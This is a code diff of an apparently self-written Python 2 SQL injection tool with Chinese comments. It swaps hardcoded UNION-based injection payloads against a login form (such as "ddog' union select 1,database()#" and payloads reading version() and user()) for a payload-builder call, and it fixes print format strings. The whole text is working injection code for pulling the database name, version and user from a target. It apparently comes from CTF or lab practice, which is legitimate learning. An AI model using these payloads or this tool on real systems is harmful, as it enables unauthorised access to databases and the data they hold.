@@ -121,8 +121,8 @@ class SqliTest(BaseConfig):
                 # 先注database长度
                 logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                 logger.debug("Start database length sqli...")
-                payload = {"user": "ddog' union select 1,length(database())#", "password": "a"}
-                # payload = "username=ddog123' && select length(database()) && '1'='1&passwd=ddog123&submit=Log+In"
+                # payload = {"user": "ddog' union select 1,length(database())#", "password": "a"}
+                payload = self.dealpayload.construct_normal_payload(select='length(database())')
                 r = self.Data.PostData(payload)
                 database_len = int(UnpackFunction(r))
                 logger.debug("Database length sqli success...The database_len is %d..." % database_len)
@@ -130,12 +130,12 @@ class SqliTest(BaseConfig):
 
                 # 然后注database
                 logger.debug("Start database sqli...")
-                payload = {"user": "ddog' union select 1,database()#", "password": "a"}
-                # payload = "username=ddog123' && select database() && '1'='1&passwd=ddog123&submit=Log+In"
+                # payload = {"user": "ddog' union select 1,database()#", "password": "a"}
+                payload = self.dealpayload.construct_normal_payload(select='database()')
                 r = self.Data.PostData(payload)
                 database = UnpackFunction(r)
                 logger.debug("Database sqli success...The database is %s" % database)
-                print "[*] database: " % database
+                print "[*] database: %s" % database
 
             elif self.sqlimethod == "build":
                 # 先注database长度
@@ -204,8 +204,8 @@ class SqliTest(BaseConfig):
             if self.sqlimethod == "normal":
                 # 先注version长度
                 logger.debug("The sqlimethod is %s..." % self.sqlimethod)
-                # payload = {"username": "ddog' or select length(database())%23", "password": "a"}
-                payload = "user=ddog123' union select 1,length(version())%23&passwd=ddog123&submit=Log+In"
+                # payload = "user=ddog123' union select 1,length(version())%23&passwd=ddog123&submit=Log+In"
+                payload = self.dealpayload.construct_normal_payload(select='length(version())')
                 r = self.Data.GetData(payload)
                 version_len = int(UnpackFunction(r))
                 logger.debug("Version length sqli success...The version_len is %d..." % version_len)
@@ -213,8 +213,8 @@ class SqliTest(BaseConfig):
 
                 # 然后注version
                 logger.debug("Start database sqli...")
-                # payload = {"username": "ddog' or select version()%23", "password": "a"}
-                payload = "user=ddog123' union select 1,version()%23&passwd=ddog123&submit=Log+In"
+                # payload = "user=ddog123' union select 1,version()%23&passwd=ddog123&submit=Log+In"
+                payload = self.dealpayload.construct_normal_payload(select='version()')
                 r = self.Data.GetData(payload)
                 version = UnpackFunction(r)
                 logger.debug("Version sqli success...The version is %s" % version)
@@ -297,7 +297,7 @@ class SqliTest(BaseConfig):
                 r = self.Data.PostData(payload)
                 version = UnpackFunction(r)
                 logger.debug("Version sqli success...The version is %s" % version)
-                print "[*] version: " % version
+                print "[*] version: %s" % version
 
             elif self.sqlimethod == "build":
                 # 先注version长度
@@ -371,8 +371,8 @@ class SqliTest(BaseConfig):
                 # 先注user长度
                 logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                 logger.debug("Start user length sqli...")
-                # payload = {"username": "ddog' or select length(user())%23", "password": "a"}
-                payload = "user=ddog123' union select 1,length(user())%23&passwd=ddog123&submit=Log+In"
+                # payload = "user=ddog123' union select 1,length(user())%23&passwd=ddog123&submit=Log+In"
+                payload = self.dealpayload.construct_normal_payload(select='length(user())')
                 r = self.Data.GetData(payload)
                 user_len = int(UnpackFunction(r))
                 logger.debug("User length sqli success...The user_len is %d..." % user_len)
@@ -380,12 +380,12 @@ class SqliTest(BaseConfig):
 
                 # 然后注user
                 logger.debug("Start user sqli...")
-                # payload = {"username": "ddog' or select user()%23", "password": "a"}
-                payload = "user=ddog123' union select 1,user()%23&passwd=ddog123&submit=Log+In"
+                # payload = "user=ddog123' union select 1,user()%23&passwd=ddog123&submit=Log+In"
+                payload = self.dealpayload.construct_normal_payload(select='user()')
                 r = self.Data.GetData(payload)
                 user = UnpackFunction(r)
                 logger.debug("User sqli success...The user is %s" % user)
-                print "[*] user: " % user
+                print "[*] user: %s" % user
 
             elif self.sqlimethod == "build":
                 # 先注user长度
@@ -450,8 +450,8 @@ class SqliTest(BaseConfig):
                 # 先注user长度
                 logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                 logger.debug("Start user length sqli...")
-                payload = {"user": "ddog' union select 1,length(user())#", "password": "a"}
-                # payload = "username=ddog123' && select length(user()) && '1'='1&passwd=ddog123&submit=Log+In"
+                # payload = {"user": "ddog' union select 1,length(user())#", "password": "a"}
+                payload = self.dealpayload.construct_normal_payload(select='length(user())')
                 r = self.Data.PostData(payload)
                 user_len = int(UnpackFunction(r))
                 logger.debug("User length sqli success...The user_len is %d..." % user_len)
@@ -459,12 +459,12 @@ class SqliTest(BaseConfig):
 
                 # 然后注user
                 logger.debug("Start user sqli...")
-                payload = {"user": "ddog' union select 1,user()#", "password": "a"}
-                # payload = "username=ddog123' && select user() && '1'='1&passwd=ddog123&submit=Log+In"
+                # payload = {"user": "ddog' union select 1,user()#", "password": "a"}
+                payload = self.dealpayload.construct_normal_payload(select='user()')
                 r = self.Data.PostData(payload)
                 user = UnpackFunction(r)
                 logger.debug("User sqli success...The user is %s" % user)
-                print "[*] user: " % user
+                print "[*] user: %s" % user
 
             elif self.sqlimethod == "build":
                 # 先注user长度
